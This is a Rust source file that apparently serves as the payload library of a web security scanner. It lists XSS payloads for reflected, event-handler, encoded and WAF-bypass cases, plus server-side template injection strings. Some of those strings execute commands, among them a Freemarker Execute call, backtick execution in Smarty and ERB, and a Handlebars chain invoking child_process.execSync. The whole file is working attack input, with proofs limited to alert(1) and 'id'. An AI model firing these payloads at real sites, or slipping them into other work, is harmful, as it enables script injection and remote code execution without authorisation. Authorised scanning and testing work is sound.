/// XSS payload library — reflected, stored, DOM, CSP bypass, mXSS, template injection.
pub struct XssPayloads;

impl XssPayloads {
    // ── Basic reflected XSS ───────────────────────────────────────────────────

    pub fn get_basic_payloads() -> Vec<String> {
        vec![
            "<script>alert(1)</script>".to_string(),
            "<img src=x onerror=alert(1)>".to_string(),
            "<svg onload=alert(1)>".to_string(),
            "<body onload=alert(1)>".to_string(),
            "<iframe src=javascript:alert(1)>".to_string(),
            "javascript:alert(1)".to_string(),
            "\"><script>alert(1)</script>".to_string(),
            "'><script>alert(1)</script>".to_string(),
            "</script><script>alert(1)</script>".to_string(),
        ]
    }

    // ── Event handler payloads ────────────────────────────────────────────────

    pub fn get_event_handlers() -> Vec<String> {
        vec![
            "<input onfocus=alert(1) autofocus>".to_string(),
            "<select onfocus=alert(1) autofocus>".to_string(),
            "<textarea onfocus=alert(1) autofocus>".to_string(),
            "<video><source onerror=alert(1)>".to_string(),
            "<audio><source onerror=alert(1)>".to_string(),
            "<marquee onstart=alert(1)>".to_string(),
            "<details open ontoggle=alert(1)>".to_string(),
            "<object data=javascript:alert(1)>".to_string(),
            "<embed src=javascript:alert(1)>".to_string(),
            "<form><button formaction=javascript:alert(1)>click</button></form>".to_string(),
            "<isindex action=javascript:alert(1) type=submit>".to_string(),
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>".to_string(),
        ]
    }

    // ── Encoding bypass payloads ──────────────────────────────────────────────

    pub fn get_encoded_payloads() -> Vec<String> {
        vec![
            // URL encoded
            "%3Cscript%3Ealert(1)%3C/script%3E".to_string(),
            // HTML entity
            "&lt;script&gt;alert(1)&lt;/script&gt;".to_string(),
            // Double URL encoded
            "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
            // Unicode escape in JS context
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e".to_string(),
            // Hex escape
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e".to_string(),
            // Nested tags (filter bypass)
            "<scr<script>ipt>alert(1)</scr</script>ipt>".to_string(),
            "<scr\x00ipt>alert(1)</scr\x00ipt>".to_string(),
        ]
    }

    // ── WAF bypass payloads ───────────────────────────────────────────────────

    pub fn get_waf_bypass_payloads() -> Vec<String> {
        vec![
            // No quotes, no spaces
            "<svg/onload=alert(1)>".to_string(),
            "<img/src=x/onerror=alert(1)>".to_string(),
            // Case variation
            "<ScRiPt>alert(1)</ScRiPt>".to_string(),
            "<IMG SRC=x ONERROR=alert(1)>".to_string(),
            // Iframe srcdoc
            "<iframe srcdoc='<script>alert(1)</script>'>".to_string(),
            // Data URI
            "<iframe src='data:text/html,<script>alert(1)</script>'>".to_string(),
            // SVG with CDATA
            "<svg><script>alert(1)</script></svg>".to_string(),
            "<svg><script>//<![CDATA[\nalert(1)//]]></script></svg>".to_string(),
            // Object tag
            "<object data='data:text/html,<script>alert(1)</script>'>".to_string(),
            // Backtick attribute delimiter (IE)
            "<img src=`x` onerror=`alert(1)`>".to_string(),
            // Newline in tag
            "<img\nsrc=x\nonerror=alert(1)>".to_string(),
            "<img\rsrc=x\ronerror=alert(1)>".to_string(),
            // Tab in tag
            "<img\tsrc=x\tonerror=alert(1)>".to_string(),
            // Null byte
            "<scr\x00ipt>alert(1)</scr\x00ipt>".to_string(),
        ]
    }

    // ── Server-side template injection (SSTI) ────────────────────────────────

    /// SSTI payloads for common template engines.
    /// These are XSS-adjacent — if the template output is reflected in HTML
    /// without encoding, SSTI can lead to XSS or RCE.
    pub fn get_ssti_payloads() -> Vec<String> {
        vec![
            // Jinja2 / Twig
            "{{7*7}}".to_string(),
            "{{7*'7'}}".to_string(),
            "{{config}}".to_string(),
            "{{self.__dict__}}".to_string(),
            // Jinja2 RCE
            "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
            // Freemarker
            "${7*7}".to_string(),
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}".to_string(),
            // Velocity
            "#set($x=7*7)${x}".to_string(),
            // Smarty
            "{php}echo `id`;{/php}".to_string(),
            // Pebble
            "{{7*7}}".to_string(),
            // Mako
            "${7*7}".to_string(),
            // ERB (Ruby)
            "<%= 7*7 %>".to_string(),
            "<%= `id` %>".to_string(),
            // Handlebars
            "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}".to_string(),
        ]
    }
}
